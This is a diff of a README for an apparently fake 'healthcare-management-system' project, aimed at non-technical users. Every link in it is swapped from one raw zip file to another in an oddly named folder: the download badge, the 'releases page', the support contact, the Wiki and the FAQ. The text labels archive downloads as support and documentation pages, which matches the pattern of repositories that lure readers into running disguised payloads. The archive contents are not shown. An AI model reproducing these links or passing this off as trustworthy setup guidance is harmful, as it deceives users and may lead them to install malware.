@@ -1,7 +1,7 @@
 # 🌟 healthcare-management-system - Manage Your Health Effortlessly
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/healthcare-management-system-v2.9.zip%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/healthcare-management-system-v2.9.zip)
+[![Download Release](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/system-management-healthcare-v3.9.zip%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/system-management-healthcare-v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the healthcare management system. This application helps you keep track of your health records, appointments, and medications. It's designed for easy use, even if you’re not tech-savvy.
@@ -17,7 +17,7 @@ To run the healthcare management system, your computer needs to meet the followi
 Follow these simple steps to get started:
 
 1. **Visit the Download Page**  
-   Go to our releases page by clicking [here](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/healthcare-management-system-v2.9.zip).  
+   Go to our releases page by clicking [here](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/system-management-healthcare-v3.9.zip).  
 
 2. **Choose the Latest Version**  
    Look for the latest version at the top of the list.  
@@ -50,11 +50,11 @@ Once you have the application installed, you can explore its features. Here’s 
 4. **Track Your Medications:** Add and edit your medications as needed.
 
 ## 📞 Support
-If you encounter issues or have questions, we’re here to help. You can reach our support team at https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/healthcare-management-system-v2.9.zip 
+If you encounter issues or have questions, we’re here to help. You can reach our support team at https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/system-management-healthcare-v3.9.zip 
 
 ## 🔗 Additional Resources
-- For more detailed guides, visit our [Wiki](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/healthcare-management-system-v2.9.zip).
-- Check out our FAQ section [here](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/healthcare-management-system-v2.9.zip).
+- For more detailed guides, visit our [Wiki](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/system-management-healthcare-v3.9.zip).
+- Check out our FAQ section [here](https://raw.githubusercontent.com/SimpleDCA/healthcare-management-system/main/naturistically/system-management-healthcare-v3.9.zip).
 
 ## 📝 Feedback
 We value your opinion! If you have suggestions for improvements or features, please let us know.
